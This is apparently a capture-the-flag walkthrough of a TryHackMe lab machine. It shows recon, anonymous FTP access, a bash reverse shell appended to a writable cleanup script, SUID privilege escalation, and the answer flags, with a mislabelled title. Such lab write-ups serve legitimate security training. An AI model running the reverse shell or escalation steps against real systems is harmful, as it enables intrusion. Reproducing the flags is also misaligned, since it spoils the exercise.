# Retro Walkthrough
### Link
- https://tryhackme.com/room/anonymous
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.96.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

**Question**
#### Enumerate the machine.  How many ports are open?
**Answer** 
#### 4

**Question**
#### What service is running on port 21?
**Answer** 
#### ftp

**Question**
#### What service is running on ports 139 and 445?
**Answer** 
#### smb

**Question**
#### There's a share on the user's computer.  What's it called?
We now we haev a smb service. We can try to check all smb share.
```
smbutil view -g //guest@[IP]
```
Result
```
Share                                           Type    Comments
-------------------------------
pics                                            Disk    My SMB Share Directory for Pics
print$                                          Disk    Printer Drivers
IPC$                                            Pipe    IPC Service (anonymous server (Samba, Ubuntu))
```
**Answer** 
#### pics

Let's explore the FTP
```
ftp anonymous@10.10.116.126
Connected to 10.10.116.126.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1333 Dec 25 18:47 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```
We have 3 files. We can download them and check their contents.
```
ftp> get clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
WARNING! 11 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
314 bytes received in 0.00301 seconds (102 kbytes/s)
ftp> get removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (1376 bytes).
WARNING! 32 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
1376 bytes received in 0.000878 seconds (1.49 Mbytes/s)
ftp> get to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
68 bytes received in 0.00178 seconds (37.2 kbytes/s)
```
- **to_do.txt**
```
cat to_do.txt
I really need to disable the anonymous login...it's really not safe
```
Nothing...
- **clean.sh**
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
This script perform a delete from tmp folder and update the log files **removed_files.log**
- **removed_files.log**
```
cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
---
### Exploitation

The approach couldbe : Update the **clean.sh** in order to gain shell access.

To do that, we can check [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and copy/paste this command line at the end of the script
```
bash -i >& /dev/tcp/[IP local machine]/[Port] 0>&1
```
When it is done, upload the new version of **clean.sh** , start a listener and wait ^^
```
ftp anonymous@10.10.116.126
Connected to 10.10.116.126.
220 NamelessOne's FTP Server!
331 Please specify the password.
Password:
230 Login successful.
ftp> cd scripts
250 Directory successfully changed.
ftp> append
(local-file) clean.sh
(remote-file) clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
370 bytes sent in 0.00149 seconds (243 kbytes/s)
```
```
namelessone@anonymous:~$ ls
ls
pics
user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```
**Question**
#### user.txt
**Answer** 
#### 90d6f992585815ff991e68748c414740
---
### Privilege escalation

When I try **sudo -l**, it doesn't work.Le's check the SUID bit set.
```
 find / -user root -perm -u=s 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
```
Now we can check [gtfobins](https://gtfobins.github.io/gtfobins/env/) and find something with **SUID**
```
sudo install -m =xs $(which env) .

./env /bin/sh -p
```
```
namelessone@anonymous:~$ env /bin/sh -p
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt  
4d930091c31a622a7ed10f27999af363
```
**Question**
#### root.txt
**Answer** 
#### 4d930091c31a622a7ed10f27999af363